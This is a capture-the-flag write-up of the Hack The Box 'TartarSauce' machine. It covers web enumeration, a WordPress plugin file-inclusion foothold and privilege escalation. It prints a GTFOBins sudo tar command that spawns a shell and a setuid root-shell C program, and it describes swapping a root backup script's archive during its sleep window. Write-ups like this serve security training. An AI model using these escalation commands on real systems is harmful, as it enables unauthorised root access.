Title: HTB TartarSauce box writeup
Tags: oscp, htb, tar, os command injection, wordpress, wpscan, sudo, gtfobins
Summary: Abusing custom scripts in a way to root shell
Date: 2020-10-19 21:50
Status: published

# Enumeration
Just the web server available:
```text
    Nmap 7.80 scan initiated Fri Oct 16 00:41:18 2020 as: nmap -sS -p- -v -oA enum/nmap-ss-all 10.10.10.88
    Nmap scan report for tartarsauce.htb (10.10.10.88)
    Host is up (0.060s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE
    80/tcp open  http
    Read data files from: /usr/bin/../share/nmap
    Nmap done at Fri Oct 16 00:42:08 2020 -- 1 IP address (1 host up) scanned in 49.32 seconds
```
Interesting entries in `robots.txt`:
```text
    Nmap 7.80 scan initiated Fri Oct 16 00:46:10 2020 as: nmap -sC -sV -A -T4 -p80 -oA enum/nmap-sCVAT4-open 10.10.10.88
    Nmap scan report for tartarsauce.htb (10.10.10.88)
    Host is up (0.051s latency).
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-robots.txt: 5 disallowed entries 
    | /webservices/tar/tar/source/ 
    | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
    |_/webservices/developmental/ /webservices/phpmyadmin/
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Landing Page
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), DD-WRT (Linux 3.18) (93%), DD-WRT v3.0 (Linux 4.4.2) (93%), Linux 4.10 (93%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   52.72 ms 10.10.14.1
    2   52.69 ms tartarsauce.htb (10.10.10.88)
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Fri Oct 16 00:46:22 2020 -- 1 IP address (1 host up) scanned in 12.45 seconds
```
Got trolled by the author a bit:

![troll 99 lvl](/cstatic/htb-tartarsauce/troll.png)

Gobustered root with big.txt from dirb wordlists:
```text
    /.htaccess (Status: 403)
    /.htpasswd (Status: 403)
    /robots.txt (Status: 200)
    /server-status (Status: 403)
    /webservices (Status: 301)
```

Gobustered `/webservices`:
```text
    /.htaccess (Status: 403)
    /.htpasswd (Status: 403)
    /wp (Status: 301)
```

Gobustered `/webservices/wp`:
```text
    /.htaccess (Status: 403)
    /.htpasswd (Status: 403)
    /wp-admin (Status: 301)
    /wp-content (Status: 301)
    /wp-includes (Status: 301)
```

Nikto results:
```text
    Nikto v2.1.6/2.1.5
    Target Host: 10.10.10.88
    Target Port: 80
    GET The anti-clickjacking X-Frame-Options header is not present.
    GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    GET Cookie PHPSESSID created without the httponly flag
    GET Entry '/webservices/monstra-3.0.4/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
    GET "robots.txt" contains 5 entries which should be manually viewed.
    GET Server may leak inodes via ETags, header found with file /, inode: 2a0e, size: 565becf5ff08d, mtime: gzip
    HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
    OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
    OSVDB-3233: GET /icons/README: Apache default file found.
```

Wordpress at `/webservices/wp` seems to be broken since all the http links on
the pages missing slash after the scheme:

![broken links](/cstatic/htb-tartarsauce/broken-links.png)

This could be 'fixed' with burp since it can search and replace arbitrary
patterns in responses:

![burp replace](/cstatic/htb-tartarsauce/burp-replace.png)

Fixed wordpress looks like this:

![fixed wp](/cstatic/htb-tartarsauce/fixed-wp.png)

Gobustered `/webservices/monstra-3.0.4`:
```text
    /.htaccess (Status: 403)
    /.htpasswd (Status: 403)
    /admin (Status: 301)
    /backups (Status: 301)
    /boot (Status: 301)
    /engine (Status: 301)
    /favicon.ico (Status: 200)
    /libraries (Status: 301)
    /plugins (Status: 301)
    /public (Status: 301)
    /robots.txt (Status: 200)
    /sitemap.xml (Status: 200)
    /storage (Status: 301)
    /tmp (Status: 301)
```

After struggling a bit with Monstra CMS I decided to enumerate wordpress
further. It looks like Monstra instance is read-only and though admin creds
were guessed right away (admin:admin) it's barely possible to do something in
there since it doesn't allow to change themes or upload files. So the first
thing to do with wordpress is to spin up a `wpscan` to try to find vulnerable
components. I did it couple of times and ended up with aggressive scans and
it turned out tha there's some interesting plugin called `gwolle-db`:

![gwolle plug](/cstatic/htb-tartarsauce/wp-plugins.png)

Some versions of it are vulnerable to 
[RFI](https://www.exploit-db.com/exploits/38861) and this one also seems so:

![RFI](/cstatic/htb-tartarsauce/rfi.png)

# Exploitation
This RFI is a direct way to get a shell on the machine:

![unpriv shell](/cstatic/htb-tartarsauce/unpriv-shell.png)

According to `sudo -l` we could run `tar` as onuma user. With help of GTFObins
it was easily escalated to user shell with following command:
`sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`.
The user shell:

![user shell](/cstatic/htb-tartarsauce/user-shell.png)

# Privilege escalation
Quick search for files owned by user or group called `onuma` revealed some
interesting entry in `/var/backup`:

![backups](/cstatic/htb-tartarsauce/backuperer.png)

With help of pspy it was almost clear that `/usr/sbin/backuperer` is in charge
for creating these files:

![backuperer pspy](/cstatic/htb-tartarsauce/backuperer-pspy.png)

The file itself is just a bash script:
```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Notice the huge delay of 30 seconds right in the middle of the script. This
allows us to replace newly created `$tmpfile` with our own archive and abuse
tar running as root. I just grabbed latest archive from the machine and put
simple suid binary written in C in there:

```C
int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", 0);
}
```
Granted it `6755` perms and archived back in such a manner:
`sudo tar -zcvf --owner=root --group=root backup.tar.gz var/`. This is to
preserve file permission that I've set for suid binary in my kali machine. Since
it will be unpacked as root, file perms will be effectively set to `6755` and
owner will be `root:root`. So to exploit that I transferred this archive back
to the tartarsauce, waited until backuperer started by schedule and replaced
temporary archive with the one I've created. Couple of seconds later I've got 
it unpacked with suid shell within:

![root shell](/cstatic/htb-tartarsauce/root-shell.png)
